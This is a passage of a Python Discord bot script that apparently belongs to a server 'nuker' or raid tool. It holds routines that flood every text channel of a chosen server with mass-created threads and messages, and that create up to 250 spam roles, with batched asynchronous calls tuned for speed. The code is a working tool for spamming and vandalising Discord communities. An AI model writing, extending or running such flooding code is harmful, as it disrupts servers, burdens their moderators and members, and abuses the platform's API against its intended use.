    """Create threads in EVERY text channel with auto message - HYPER FAST"""
    try:
        guild = bot.get_guild(int(server_id))
        if not guild:
            print(Colorate.Horizontal(Colors.red_to_blue, "[-] SERVER NOT FOUND."))
            return

        # Check bot permissions
        bot_member = guild.get_member(bot.user.id)
        try:
            if not bot_member.guild_permissions.create_public_threads:
                print(Colorate.Horizontal(Colors.red_to_blue, "[-] BOT NEEDS 'CREATE PUBLIC THREADS' PERMISSION!"))
                return
        except AttributeError:
            print(Colorate.Horizontal(Colors.yellow, "[!] PERMISSION CHECK SKIPPED (OLD VERSION)"))
            print(Colorate.Horizontal(Colors.yellow, "[!] MAKE SURE BOT HAS THREAD PERMISSIONS"))

        print(Colorate.Horizontal(Colors.yellow, "=" * 60))
        print(Colorate.Horizontal(Colors.yellow_to_green, "[+] CREATE MASS THREADS"))
        print(Colorate.Horizontal(Colors.yellow, "=" * 60))

        # Get all text channels
        text_channels = [ch for ch in guild.channels if isinstance(ch, discord.TextChannel)]
        
        if not text_channels:
            print(Colorate.Horizontal(Colors.yellow_to_green, "[-] NO TEXT CHANNELS FOUND."))
            return

        print(Colorate.Horizontal(Colors.yellow_to_green, f"[+] FOUND {len(text_channels)} TEXT CHANNELS"))

        # Get thread name
        thread_name = await asyncio.to_thread(input, Colorate.Horizontal(Colors.yellow_to_green, "ENTER THREAD NAME ~ "))
        
        if not thread_name:
            print(Colorate.Horizontal(Colors.red_to_blue, "[-] THREAD NAME CANNOT BE EMPTY."))
            return

        # Get message for thread
        thread_message = await asyncio.to_thread(input, Colorate.Horizontal(Colors.yellow_to_green, "ENTER MESSAGE TO SEND IN THREAD ~ "))
        
        if not thread_message:
            thread_message = "Welcome to this thread! 🚀"
            print(Colorate.Horizontal(Colors.yellow, "[!] USING DEFAULT MESSAGE"))

        # Get number of threads per channel
        threads_per_channel = await asyncio.to_thread(input, Colorate.Horizontal(Colors.yellow_to_green, "HOW MANY THREADS PER CHANNEL? (DEFAULT: 5, MAX: 20) ~ "))
        try:
            threads_per_channel = int(threads_per_channel) if threads_per_channel else 5
            if threads_per_channel < 1:
                threads_per_channel = 1
            if threads_per_channel > 20:
                threads_per_channel = 20
                print(Colorate.Horizontal(Colors.yellow, "[!] MAX 20 THREADS PER CHANNEL"))
        except ValueError:
            threads_per_channel = 5
            print(Colorate.Horizontal(Colors.yellow, "[!] USING DEFAULT: 5 THREADS"))

        total_threads = len(text_channels) * threads_per_channel
        print(Colorate.Horizontal(Colors.yellow_to_green, f"[+] TOTAL THREADS TO CREATE: {total_threads} ({len(text_channels)} channels × {threads_per_channel} threads)"))

        confirm = await asyncio.to_thread(input, Colorate.Horizontal(Colors.red_to_blue, f"CREATE {total_threads} THREADS WITH MESSAGE? Y/N ~ "))
        if confirm.lower() != 'y':
            print(Colorate.Horizontal(Colors.yellow_to_green, "[-] OPERATION CANCELED."))
            return

        if total_threads > 100:
            confirm2 = await asyncio.to_thread(input, Colorate.Horizontal(Colors.red_to_blue, f"⚠️ {total_threads} THREADS WILL BE CREATED. CONTINUE? Y/N ~ "))
            if confirm2.lower() != 'y':
                print(Colorate.Horizontal(Colors.yellow_to_green, "[-] OPERATION CANCELED."))
                return

        print(Colorate.Horizontal(Colors.yellow_to_green, "[+] CREATING THREADS WITH MESSAGES..."))
        print(Colorate.Horizontal(Colors.yellow, "-" * 40))
        
        created = 0
        failed = 0
        start_time = time.time()
        
        # HYPER BATCH - 20 threads ek saath
        batch_size = 20
        all_tasks = []
        
        for channel in text_channels:
            for i in range(threads_per_channel):
                random_num = random.randint(100, 9999)
                name = f"{thread_name}{random_num}"
                all_tasks.append(create_thread_with_message(channel, name, thread_message))
        
        # Process in batches
        for i in range(0, len(all_tasks), batch_size):
            batch = all_tasks[i:i+batch_size]
            results = await asyncio.gather(*batch, return_exceptions=True)
            
            for result in results:
                if isinstance(result, Exception):
                    failed += 1
                    print(Colorate.Horizontal(Colors.red_to_blue, f"❌ Thread creation failed"))
                else:
                    created += 1
                    print(Colorate.Horizontal(Colors.yellow_to_green, f"📌 Thread created with message"))
            
            # Small delay between batches
            await asyncio.sleep(0.3)
    except ValueError:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] INVALID SERVER ID."))
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_blue, f"[-] ERROR: {e}"))

async def create_thread_with_message(channel, thread_name, message_content):
    """Create a thread and send a message in it"""
    # Create thread
    thread = await channel.create_thread(
        name=thread_name,
        type=discord.ChannelType.public_thread,
        auto_archive_duration=60
    )
    # Send message in thread
    await thread.send(message_content)
    return True
# ============================================ CREATE ROLES ============================================
async def create_roles(server_id):
    """Create roles - SUPER FAST (50 roles/sec)"""
    try:
        guild = bot.get_guild(int(server_id))
        if not guild:
            print(Colorate.Horizontal(Colors.red_to_blue, "[-] SERVER NOT FOUND."))
            return

        # Check bot permissions
        bot_member = guild.get_member(bot.user.id)
        if not bot_member.guild_permissions.manage_roles:
            print(Colorate.Horizontal(Colors.red_to_blue, "[-] BOT NEEDS 'MANAGE ROLES' PERMISSION!"))
            return

        print(Colorate.Horizontal(Colors.yellow, "=" * 60))
        print(Colorate.Horizontal(Colors.yellow_to_green, "[+] CREATE ROLES"))
        print(Colorate.Horizontal(Colors.yellow, "=" * 60))

        # Get number of roles
        num_roles = await asyncio.to_thread(input, Colorate.Horizontal(Colors.yellow_to_green, "HOW MANY ROLES TO CREATE? ~ "))
        try:
            num_roles = int(num_roles)
            if num_roles < 1:
                print(Colorate.Horizontal(Colors.red_to_blue, "[-] MUST BE AT LEAST 1."))
                return
            if num_roles > 250:
                print(Colorate.Horizontal(Colors.yellow, "[!] MAX 250 ROLES (Discord limit)"))
                num_roles = 250
        except ValueError:
            print(Colorate.Horizontal(Colors.red_to_blue, "[-] INVALID NUMBER."))
            return

        # Get role name
        role_name = await asyncio.to_thread(input, Colorate.Horizontal(Colors.yellow_to_green, "ENTER ROLE NAME ~ "))
        
        if not role_name:
            print(Colorate.Horizontal(Colors.red_to_blue, "[-] ROLE NAME CANNOT BE EMPTY."))
            return

        # Random color option
        random_color = await asyncio.to_thread(input, Colorate.Horizontal(Colors.yellow_to_green, "RANDOM COLORS? (y/n) ~ "))
        random_color = random_color.lower() == 'y'

        confirm = await asyncio.to_thread(input, Colorate.Horizontal(Colors.red_to_blue, f"CREATE {num_roles} ROLES? Y/N ~ "))
        if confirm.lower() != 'y':
            print(Colorate.Horizontal(Colors.yellow_to_green, "[-] OPERATION CANCELED."))
            return

        if num_roles > 100:
            confirm2 = await asyncio.to_thread(input, Colorate.Horizontal(Colors.red_to_blue, f"⚠️ {num_roles} ROLES WILL BE CREATED. CONTINUE? Y/N ~ "))
            if confirm2.lower() != 'y':
                print(Colorate.Horizontal(Colors.yellow_to_green, "[-] OPERATION CANCELED."))
                return

        print(Colorate.Horizontal(Colors.yellow_to_green, "[+] CREATING ROLES..."))
        print(Colorate.Horizontal(Colors.yellow, "-" * 40))
        
        created = 0
        failed = 0
        start_time = time.time()
        
        # BATCH PROCESSING 
        batch_size = 50
        total_roles = num_roles
        
        for i in range(0, total_roles, batch_size):
            batch_count = min(batch_size, total_roles - i)
            tasks = []
            role_names = []
            
            for j in range(batch_count):
                if random_color:
                    color = discord.Colour.from_rgb(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
                else:
                    color = discord.Colour.default()
                
                random_num = random.randint(100, 9999)
                name = f"{role_name}{random_num}"
                role_names.append(name)
                tasks.append(create_role_task(guild, name, color))
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for j, result in enumerate(results):
                if isinstance(result, Exception):
                    failed += 1
                    print(Colorate.Horizontal(Colors.red_to_blue, f"❌ {role_names[j]} failed"))
                else:
                    created += 1
                    print(Colorate.Horizontal(Colors.yellow_to_green, f"🎭 {role_names[j]} created"))
    except ValueError:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] INVALID SERVER ID."))
    except discord.Forbidden:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] BOT DOESN'T HAVE 'MANAGE ROLES' PERMISSION!"))
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_blue, f"[-] ERROR: {e}"))

async def create_role_task(guild, name, color):
    """Helper function for creating a single role"""
    await guild.create_role(name=name, colour=color)
    return True

bot.run(bot_token)